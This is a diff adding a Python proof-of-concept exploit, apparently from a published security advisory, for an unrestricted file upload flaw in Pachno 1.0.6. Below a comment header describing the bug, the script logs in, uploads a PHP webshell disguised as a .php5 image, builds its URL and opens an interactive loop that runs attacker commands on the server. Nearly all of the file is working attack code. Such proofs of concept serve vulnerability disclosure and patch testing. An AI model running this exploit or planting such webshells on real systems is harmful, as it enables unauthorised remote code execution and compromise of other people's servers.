@@ -1,0 +1,106 @@
+#!/usr/bin/env python3
+#
+#
+# Pachno 1.0.6 (uploadfile) Unrestricted File Upload Remote Code Execution
+#
+#
+# Vendor: Daniel André Eikeland
+# Product web page: https://github.com/pachno/pachno
+# Affected version: 1.0.6
+#
+# Summary: Pachno is an open-source collaboration platform (formerly known as The Bug Genie)
+# designed for team project management, issue tracking, and documentation. It offers a module-based,
+# customizable environment for software development and team workflows, distributed under the
+# Mozilla Public License.
+#
+# Desc: The multipart file parameter to the /uploadfile endpoint allows authenticated users to
+# upload files directly to the server. File upload must be enabled by an admin, who can also
+# configure the storage path, within a web-accessible /public directory. Extension filtering
+# is ineffective. Although a blacklist exists, it is never used (dead code), allowing arbitrary
+# file types such as .php5 to be uploaded. Files are stored on disk regardless of permission
+# checks. If the upload path is web-accessible, uploaded scripts can be executed, leading to
+# remote code execution.
+#
+# Tested on: GNU/Linux
+#            Apache2
+#            PHP/7.4
+#            MySQL/5.7 (MariaDB)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-5982
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5982
+#
+#
+# 06.04.2026
+#
+#
+
+import requests
+import time
+import sys
+
+if len(sys.argv) < 4:
+    print(f"Usage: {sys.argv[0]} <host> <username> <password>")
+    print("Example: python3 poc.py http://127.0.0.1 admin admin")
+    sys.exit(1)
+
+host = sys.argv[1].rstrip('/')
+user = sys.argv[2]
+passwd = sys.argv[3]
+
+s = requests.Session()
+
+print("[+] Logging in...")
+login_data = {"username": user, "password": passwd, "rememberme": "1"}
+
+r = s.post(f"{host}/login", data=login_data, timeout=10)
+
+if r.status_code != 200 or "username=" not in str(r.cookies):
+    print("[-] Login failed")
+    sys.exit(1)
+
+print("[+] Login successful")
+print("[+] Uploading webshell...")
+
+webshell = '''<?php if(isset($_GET['cmd'])) echo "<pre>".shell_exec($_GET['cmd'])."</pre>"; ?>'''
+
+files = {'file': ('shell.php5', webshell, 'image/png')}
+
+r = s.post(f"{host}/uploadfile", files=files, timeout=10)
+
+if r.status_code not in [200, 201, 204]:
+    print(f"[-] Upload failed: {r.status_code}")
+    sys.exit(1)
+
+print("[+] Webshell uploaded successfully!")
+
+user_id = 2
+timestamp = int(time.time())
+
+filename = f"{user_id}_{timestamp}_shell.php5"
+shell_url = f"{host}/public/{filename}"
+
+print(f"[+] Filename: {filename}")
+print(f"[+] Webshell URL: {shell_url}\n")
+
+while True:
+    try:
+        cmd = input("___ ").strip()
+        if cmd.lower() in ['exit', 'quit']:
+            break
+        if not cmd:
+            continue
+
+        resp = s.get(shell_url, params={'cmd': cmd}, timeout=10)
+        print(resp.text if resp.status_code == 200 else f"[-] Error: {resp.status_code}")
+
+    except KeyboardInterrupt:
+        break
+    except Exception as j:
+        print(f"[-] Error: {j}")
+
+print("\n[+] Done")
